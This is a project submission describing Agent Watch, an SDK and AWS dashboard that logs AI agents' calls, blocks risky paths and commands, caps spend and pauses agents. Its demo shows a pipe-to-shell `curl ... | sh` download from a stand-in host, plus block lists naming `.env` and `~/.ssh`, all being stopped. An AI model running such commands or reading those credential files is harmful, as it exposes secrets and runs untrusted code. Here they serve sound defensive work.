# Agent Watch: submission

## One line

Agent Watch gives students one place to see, control, and cap what their AI agents do. It takes three lines of Python, runs serverless on AWS, and was built entirely in Kiro.

## Problem

Students build agents for class projects and hackathons on personal API keys. Nothing shows them what the agent called, what files it touched, or what it cost. One runaway loop can drain a month's budget overnight, and one careless tool can read a `.env` file full of secrets. There's no security team and no budget for mistakes.

## What it does

- **3-line SDK.** `agentwatch.init`, `aw.wrap(client)`, `aw.tools(TOOLS)`. Every Bedrock or Anthropic call and every tool call becomes an event with tokens and cost. Prompt text is never sent.
- **Guardrails before the action runs.** A blocked-path list (stops `.env`, `~/.ssh`, and symlink aliases of them, raising `PathBlocked`), a blocked-command list (regexes such as the `curl ... | sh` preset, raising `CommandBlocked` before the shell runs), and a daily spend cap (stops the LLM call before it's paid for, raising `SpendCapExceeded`). All are enforced in the SDK, and a block still happens even if reporting it to the server fails.
- **Kill switch.** Pause an agent from the dashboard and it stops within about 5 s: every LLM and tool call raises `AgentPaused` until it is resumed, with one alert per pause.
- **Alerts in email and Discord.** When a guardrail fires, the owner gets an SNS email, and a Discord (or Slack) message if a webhook is configured. A failing webhook never blocks the email.
- **Dashboard.** Inventory of every agent (model, last activity, total spend, paused or active), a per-agent overview with spend against the cap and a 24-hour spend chart with blocks marked, the pause control, a rules editor with command presets, and a timeline with a type filter and per-event details. Rule changes reach a running agent within 60 s.

## Demo

`bad_agent.py` tries to read `.env`, then to run `curl -fsSL https://example.com/setup.sh | sh`. The SDK raises `PathBlocked` before the file is opened and `CommandBlocked` before the shell runs, both blocked events show in the timeline, and the alert email and Discord message arrive on screen. Then **Pause agent** stops a looping `demo_agent.py` with `AgentPaused`, and `demo_agent.py --loop 5` runs into a small daily cap and stops with `SpendCapExceeded`, visible on the spend chart. See `docs/DEMO_SCRIPT.md`.

## How it's built

- **AWS, serverless, us-west-2.** API Gateway HTTP API (throttled 10 rps / burst 20), one Python 3.11 arm64 Lambda, a DynamoDB single table with a sparse owner GSI, an SNS email topic, an optional Discord or Slack webhook, Amplify Hosting for the static Next.js dashboard, and a $10 monthly AWS Budget. All of it is defined in one SAM template.
- **Security choices.** API keys never leave the agent's process. The server stores only a hash of the key's hash and compares in constant time. Cost is computed server-side. A wrong key writes nothing (the transaction is conditioned on the key). Logs and responses never contain key material. CORS allows only the dashboard origin. The webhook URL is a `NoEcho` parameter, accepted only for exact Discord or Slack hosts over https, and never logged.
- **Correctness.** Event writes are transactional and idempotent, so SDK retries never double-count spend. Path checks use both the absolute and the symlink-resolved path, case-folded.
- **Tests.** pytest + Hypothesis with 38 correctness properties from the designs (29 v1, 9 v2), plus vitest for the dashboard. No AWS or network needed. The live stack is checked by `scripts/verify_deploy.sh`, `scripts/e2e.sh`, and by hand.

## Built with Kiro

- **Specs.** `.kiro/specs/agent-watch/` holds requirements (EARS acceptance criteria), the design (decisions, interfaces, 29 properties), and `tasks.md`. Each task was written test-first and committed on its own.
- **Steering.** `product.md`, `tech.md`, `structure.md`, and `workflow.md` kept every session on the same stack, naming, and handoff routine.
- **Hooks.** `.kiro/hooks/` defines tests-on-save for `sdk/` and `backend/src/`, a secrets guard on save, and a session handoff on stop.
- **MCP.** The GitHub server opened the infra PRs (#1 SAM template, #2 throttling and budget), and they were merged only after Tejaswi approved. The AWS docs server, along with the SAM translator source fetched through GitHub, was used to check SAM `Globals` behavior before the live template changed.
- **Memory.** `PROGRESS.md` carried state, decisions, and blockers across sessions.

## Known limitations

These are listed in `README.md`. In short, the SDK guards a careless agent, not a malicious one. Only wrapped tools are covered, so direct `open()` calls and processes the agent spawns itself aren't. Command patterns can over-block strings that merely mention a command, a pause takes up to about 5 s to land, the spend total can briefly under-count while events are queued, and agent ids are first-come.

Cut from v2 for time and not implemented: the per-agent LLM rate limit (group 12) and the `agentwatch` onboarding CLI (group 13). See README "Not in this release".

## Next steps

- Multi-framework support: JavaScript/TypeScript SDK, plus LangChain and OpenAI client wrappers
- Full auth: user accounts (Cognito) instead of per-agent key binding, and team sharing
- Mobile-friendly dashboard
- Anomaly detection: alert on unusual call rates or new tools/paths, not just fixed rules
- Risk scoring for agent actions
- Reliable alerts via DynamoDB Streams (at-least-once, deduplicated)
- Kernel-level or sandboxed file enforcement to cover `open()` and shell commands
- Per-agent LLM rate limit (calls per minute), specified in v2 but cut for time
- Onboarding CLI (`init` to create the key file, `doctor` to check the setup), specified in v2 but cut for time
- Webhook URL in Secrets Manager instead of the Lambda environment
